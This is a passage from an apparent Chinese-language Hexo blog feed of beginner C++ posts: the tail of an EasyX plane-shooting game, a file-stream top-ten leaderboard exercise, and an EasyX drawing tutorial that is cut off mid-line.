class="built_in">setCurrentIndex</span>(<span class="number">1</span>); <span class="comment">// 初始化数据并返回游戏界面</span></span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="built_in">addButton</span>(<span class="number">12</span>, fail_exit); <span class="comment">// 将按钮添加到页面</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 13. 成功界面</span></span><br><span class="line">        IMAGE *page_success = <span class="keyword">new</span> <span class="built_in">IMAGE</span>(width, height);</span><br><span class="line">        <span class="built_in">loadimage</span>(page_success, <span class="string">L&quot;./resource/page/success.jpg&quot;</span>, width + <span class="number">150</span>, height, <span class="literal">true</span>);</span><br><span class="line">        <span class="built_in">putimage</span>(<span class="number">0</span>, <span class="number">0</span>, page_success);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">loadimage</span>(page_success, <span class="string">L&quot;./resource/page/666.png&quot;</span>, <span class="number">120</span>, <span class="number">120</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="built_in">drawAlpha</span>(page_success, <span class="number">130</span>, <span class="number">260</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//绘制成功标题</span></span><br><span class="line">        RECT rect_success = &#123; <span class="number">220</span>, <span class="number">60</span>, <span class="number">580</span>, <span class="number">200</span> &#125;;</span><br><span class="line">        <span class="built_in">fillroundrect</span>(rect_success.left, rect_success.top, rect_success.right, rect_success.bottom, <span class="number">50</span>, <span class="number">50</span>); <span class="comment">// 绘制标题</span></span><br><span class="line">        <span class="built_in">settextcolor</span>(GREEN); <span class="comment">// 设置文本颜色为绿色</span></span><br><span class="line">        <span class="built_in">setbkmode</span>(TRANSPARENT); <span class="comment">// 设置文本背景透明</span></span><br><span class="line">        <span class="built_in">settextstyle</span>(<span class="number">35</span>, <span class="number">0</span>, _T(<span class="string">&quot;华文琥珀&quot;</span>)); <span class="comment">// 设置文本大小和字体</span></span><br><span class="line">        text_x = rect_success.left + (rect_success.right - rect_success.left - <span class="built_in">textwidth</span>(success_name.<span class="built_in">c_str</span>())) / <span class="number">2</span>;</span><br><span class="line">        text_y = rect_success.top + (rect_success.bottom - rect_success.top - <span class="built_in">textheight</span>(success_name.<span class="built_in">c_str</span>())) / <span class="number">2</span>;</span><br><span class="line">        <span class="built_in">outtextxy</span>(text_x, text_y, success_name.<span class="built_in">c_str</span>()); <span class="comment">// 在按钮上绘制文本</span></span><br><span class="line">        <span class="built_in">fillroundrect</span>(rect_success.left - <span class="number">120</span>, rect_success.top + <span class="number">190</span>, rect_success.right - <span class="number">340</span>, rect_success.bottom + <span class="number">90</span>, <span class="number">50</span>, <span class="number">50</span>); <span class="comment">// 绘制安慰</span></span><br><span class="line">        <span class="built_in">settextstyle</span>(<span class="number">25</span>, <span class="number">0</span>, _T(<span class="string">&quot;华文琥珀&quot;</span>)); <span class="comment">// 设置文本大小和字体</span></span><br><span class="line">        <span class="built_in">outtextxy</span>(rect_success.left - <span class="number">100</span>, rect_success.top + <span class="number">200</span>, <span class="string">L&quot;牛哇牛哇！&quot;</span>); <span class="comment">// 绘制通关提示</span></span><br><span class="line">        <span class="built_in">getimage</span>(page_success, <span class="number">0</span>, <span class="number">0</span>, width, height); <span class="comment">// 将页面的内容保存到图片中</span></span><br><span class="line">        <span class="built_in">addPage</span>(page_success); <span class="comment">// 添加成功页面</span></span><br><span class="line">        <span class="comment">// 在成功页面创建重新挑战按钮</span></span><br><span class="line">        Button *success_restart = <span class="keyword">new</span> <span class="built_in">Button</span>(<span class="number">320</span>, <span class="number">280</span>, <span class="number">180</span>, <span class="number">90</span>, <span class="string">L&quot;重新挑战&quot;</span>, [&amp;]() &#123;</span><br><span class="line">            <span class="comment">//init(); // 初始化数据并返回游戏界面</span></span><br><span class="line">            <span class="built_in">setCurrentIndex</span>(<span class="number">2</span>);</span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="built_in">addButton</span>(<span class="number">13</span>, success_restart); <span class="comment">// 将按钮添加到页面</span></span><br><span class="line">        <span class="comment">// 在成功页面创建返回按钮</span></span><br><span class="line">        Button *success_exit = <span class="keyword">new</span> <span class="built_in">Button</span>(<span class="number">320</span>, <span class="number">420</span>, <span class="number">180</span>, <span class="number">90</span>, <span class="string">L&quot;返回开始界面&quot;</span>, [&amp;]() &#123;</span><br><span class="line">            <span class="built_in">setCurrentIndex</span>(<span class="number">1</span>); <span class="comment">// 初始化数据并返回游戏界面</span></span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="built_in">addButton</span>(<span class="number">13</span>, success_exit); <span class="comment">// 将按钮添加到页面</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">setCurrentIndex</span>(<span class="number">0</span>); <span class="comment">// 设置初始显示页面</span></span><br><span class="line">        <span class="built_in">FlushBatchDraw</span>(); <span class="comment">// 将缓冲区内容显示在屏幕上</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 运行，进入消息循环</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ExMessage msg;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">BeginBatchDraw</span>(); <span class="comment">// 开始批量绘制</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">peekmessage</span>(&amp;msg)) <span class="comment">// 检查是否有消息</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="type">int</span> mouseX = msg.x; <span class="comment">// 获取鼠标x坐标</span></span><br><span class="line">                <span class="type">int</span> mouseY = msg.y; <span class="comment">// 获取鼠标y坐标</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">switch</span> (msg.message)</span><br><span class="line">                &#123;</span><br><span class="line">                <span class="keyword">case</span> WM_LBUTTONDOWN: <span class="comment">// 鼠标左键按下事件</span></span><br><span class="line">                    <span class="built_in">mouseClick</span>(mouseX, mouseY); <span class="comment">// 处理鼠标点击事件</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> WM_MOUSEMOVE: <span class="comment">// 鼠标移动事件</span></span><br><span class="line">                    <span class="built_in">mouseMove</span>(mouseX, mouseY); <span class="comment">// 处理鼠标移动事件</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">draw</span>(); <span class="comment">// 绘制当前页面内容</span></span><br><span class="line">            <span class="built_in">FlushBatchDraw</span>(); <span class="comment">// 将缓冲区内容显示在屏幕上</span></span><br><span class="line">            <span class="built_in">Sleep</span>(<span class="number">10</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">EndBatchDraw</span>(); <span class="comment">// 结束批量绘制</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">close</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">closegraph</span>(); <span class="comment">// 关闭图形环境</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">mciSendString</span>(<span class="string">L&quot;open ./music/game_music.mp3&quot;</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">mciSendString</span>(<span class="string">L&quot;play ./music/game_music.mp3&quot;</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="function">Widget <span class="title">widget</span><span class="params">(<span class="number">800</span>, <span class="number">640</span>)</span></span>;</span><br><span class="line">    widget.<span class="built_in">init</span>();</span><br><span class="line">    widget.<span class="built_in">run</span>();</span><br><span class="line">    widget.<span class="built_in">close</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="完整版项目体验"><a href="#完整版项目体验" class="headerlink" title="完整版项目体验"></a>完整版项目体验</h2><p><a href="https://github.com/hellodqy/Plane-Fight/blob/main/%E9%A3%9E%E6%9C%BA%E5%A4%A7%E6%88%98v1.3.zip">下载地址</a></p>]]></content>
      
      
      <categories>
          
          <category> c++ </category>
          
          <category> 项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 项目 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件流操作实现排行榜前十位</title>
      <link href="/post/935c4202.html"/>
      <url>/post/935c4202.html</url>
      
        <content type="html"><![CDATA[<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>通过文件流实现录入用户信息和显示排行榜前十数据</p><p>练手题，写的有些乱</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">information</span></span><br><span class="line">&#123;</span><br><span class="line">string name = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line"><span class="type">int</span> score = <span class="number">-1</span>;</span><br><span class="line">&#125; info[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">view</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">ifstream fin;</span><br><span class="line">fin.<span class="built_in">open</span>(<span class="string">&quot;./data.txt&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!fin.<span class="built_in">is_open</span>())</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;读取文件失败! &quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> rank;</span><br><span class="line">string name;</span><br><span class="line"><span class="type">int</span> score;</span><br><span class="line">cout &lt;&lt; <span class="built_in">setw</span>(<span class="number">20</span>) &lt;&lt; left &lt;&lt; <span class="string">&quot;排名&quot;</span> &lt;&lt; <span class="built_in">setw</span>(<span class="number">20</span>) &lt;&lt; left &lt;&lt; <span class="string">&quot;昵称&quot;</span> &lt;&lt; <span class="built_in">setw</span>(<span class="number">20</span>) &lt;&lt; left &lt;&lt; <span class="string">&quot;积分&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">while</span>(fin &gt;&gt; rank &gt;&gt; name &gt;&gt; score)</span><br><span class="line">cout &lt;&lt; <span class="built_in">setw</span>(<span class="number">20</span>) &lt;&lt; left &lt;&lt; rank &lt;&lt; <span class="built_in">setw</span>(<span class="number">20</span>) &lt;&lt; left &lt;&lt; name &lt;&lt; <span class="built_in">setw</span>(<span class="number">20</span>) &lt;&lt; left &lt;&lt; score &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;---------------------------------------&quot;</span> &lt;&lt; endl;</span><br><span class="line">fin.<span class="built_in">close</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> rank;</span><br><span class="line">ifstream fin;</span><br><span class="line">fin.<span class="built_in">open</span>(<span class="string">&quot;./data.txt&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!fin.<span class="built_in">is_open</span>())</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;读取文件失败! &quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (fin &gt;&gt; rank &gt;&gt; info[i].name &gt;&gt; info[i].score)</span><br><span class="line">++i;</span><br><span class="line">fin.<span class="built_in">close</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">write</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">read</span>();</span><br><span class="line">ofstream fout;</span><br><span class="line">fout.<span class="built_in">open</span>(<span class="string">&quot;./data.txt&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!fout.<span class="built_in">is_open</span>())</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;打开文件失败! &quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">string name;</span><br><span class="line"><span class="type">int</span> score;</span><br><span class="line"><span class="type">int</span> rank = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;请输入您的昵称和积分: &quot;</span>;</span><br><span class="line">cin &gt;&gt; name &gt;&gt; score;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (info[<span class="number">0</span>].name == <span class="string">&quot;NULL&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">fout &lt;&lt; rank &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; name &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; score &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (info[<span class="number">9</span>].name != <span class="string">&quot;NULL&quot;</span>)<span class="comment">// 排行榜已经有10位</span></span><br><span class="line">&#123;</span><br><span class="line">info[<span class="number">9</span>].name = name;</span><br><span class="line">info[<span class="number">9</span>].score = score;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 冒泡排序</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">9</span> - i; ++j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (info[j].score &lt; info[j + <span class="number">1</span>].score)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">information</span> temp;</span><br><span class="line">temp = info[j];</span><br><span class="line">info[j] = info[j + <span class="number">1</span>];</span><br><span class="line">info[j + <span class="number">1</span>] = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">fout &lt;&lt; i + <span class="number">1</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; info[i].name &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; info[i].score &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> num = <span class="number">0</span>;<span class="comment">// 统计在榜人数</span></span><br><span class="line"><span class="keyword">for</span> (; info[num].name != <span class="string">&quot;NULL&quot;</span>; ++num) &#123;&#125;</span><br><span class="line"></span><br><span class="line">info[num].name = name;</span><br><span class="line">info[num].score = score;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 冒泡排序</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; num; ++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; num - i; ++j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (info[j].score &lt; info[j + <span class="number">1</span>].score)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">information</span> temp;</span><br><span class="line">temp = info[j];</span><br><span class="line">info[j] = info[j + <span class="number">1</span>];</span><br><span class="line">info[j + <span class="number">1</span>] = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; num + <span class="number">1</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">fout &lt;&lt; i + <span class="number">1</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; info[i].name &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; info[i].score &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;---------------------------------------&quot;</span> &lt;&lt; endl;</span><br><span class="line">fout.<span class="built_in">close</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> choice;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;请问您需要查看还是写入文件: \n1-&gt;查看\n2-&gt;写入\n输入其他任意字符退出程序&quot;</span> &lt;&lt; endl;</span><br><span class="line">cin &gt;&gt; choice;</span><br><span class="line"><span class="keyword">switch</span> (choice)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"><span class="built_in">view</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line"><span class="built_in">write</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;程序即将退出...&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">while</span> (!<span class="built_in">menu</span>())&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> c++ </category>
          
          <category> 文件流 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++文件流 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Easyx常用操作</title>
      <link href="/post/22f66066.html"/>
      <url>/post/22f66066.html</url>
      
        <content type="html"><![CDATA[<h2 id="图形与文字绘制"><a href="#图形与文字绘制" class="headerlink" title="图形与文字绘制"></a>图形与文字绘制</h2><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><ul><li>很多函数有大小写两个版本，<code>EasyX</code>选全小写版本，<code>WinSDK</code>选大写版本</li><li><code>easyx.h</code>自带<code>windows.h</code></li><li>下图是<code>EasyX</code>安装路径</li></ul><p><img src="https://z1.ax1x.com/2023/09/17/pPhEjp9.png" alt="image 20230909160130745"></p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p><img src="https://z1.ax1x.com/2023/09/17/pPhVpm6.png" alt="image 20230909154013480"> </p><p><img src="https://z1.ax1x.com/2023/09/17/pPhEvlR.png" alt="image 20230909160458685"></p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;graphics.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">round_rec</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> left;</span><br><span class="line"><span class="type">int</span> top;</span><br><span class="line"><span class="type">int</span> right;</span><br><span class="line"><span class="type">int</span> bottom;</span><br><span class="line"><span class="type">int</span> ew;</span><br><span class="line"><span class="type">int</span> eh;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">circle</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line"><span class="type">int</span> y;</span><br><span class="line"><span class="type">int</span> r;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">/* 窗口设置 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个窗口, 宽640，高480</span></span><br><span class="line"><span class="comment">// initgraph(640, 480, SHOWCONSOLE | NOCLOSE | NOMINIMIZE);</span></span><br><span class="line"><span class="built_in">initgraph</span>(<span class="number">640</span>, <span class="number">480</span>, SHOWCONSOLE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置窗口标题</span></span><br><span class="line">HWND hnd = <span class="built_in">GetHWnd</span>();<span class="comment">//获取窗口句柄</span></span><br><span class="line"><span class="built_in">SetWindowText</span>(hnd, <span class="string">L&quot;欢迎来到DQY&amp;WYの小窝~&quot;</span>);<span class="comment">//设置窗口标题 第一个参数传入窗口句柄，第二个参数设置字符串</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置背景颜色</span></span><br><span class="line"><span class="built_in">setbkcolor</span>(WHITE);</span><br><span class="line"><span class="comment">// 清屏, 必须在设置背景颜色后使用才有效果</span></span><br><span class="line"><span class="built_in">cleardevice</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 图形设置 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置线条样式，设置一次影响后面所有</span></span><br><span class="line"><span class="comment">// 实线；宽度5</span></span><br><span class="line"><span class="built_in">setlinestyle</span>(PS_SOLID, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置线条颜色，设置一次影响后面所有</span></span><br><span class="line"><span class="built_in">setlinecolor</span>(BROWN);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置填充颜色，设置一次影响后面所有</span></span><br><span class="line"><span class="built_in">setfillcolor</span>(YELLOW);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 绘图</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">circle</span> cir = &#123;<span class="number">50</span>, <span class="number">60</span>, <span class="number">50</span>&#125;;</span><br><span class="line"><span class="built_in">circle</span>(cir.x, cir.y, cir.r);</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">circle</span> fill_cir = &#123; <span class="number">160</span>, <span class="number">60</span>, <span class="number">50</span> &#125;;</span><br><span class="line"><span class="built_in">fillcircle</span>(fill_cir.x, fill_cir.y, fill_cir.r);</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">circle</span> solid_cir = &#123; <span class="number">270</span>, <span class="number">60</span>, <span class="number">50</span> &#125;;</span><br><span class="line"><span class="built_in">solidcircle</span>(solid_cir.x, solid_cir.y, solid_cir.r);</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">round_rec</span> fill_roundrec = &#123; <span class="number">10</span>, <span class="number">150</span>, <span class="number">300</span>, <span class="number">300</span>, <span class="number">10</span>, <span class="number">50</span> &#125;;</span><br><span class="line"><span class="built_in">fillroundrect</span>(fill_roundrec.left, fill_roundrec.top, fill_roundrec.right, fill_roundrec.bottom, fill_roundrec.ew, 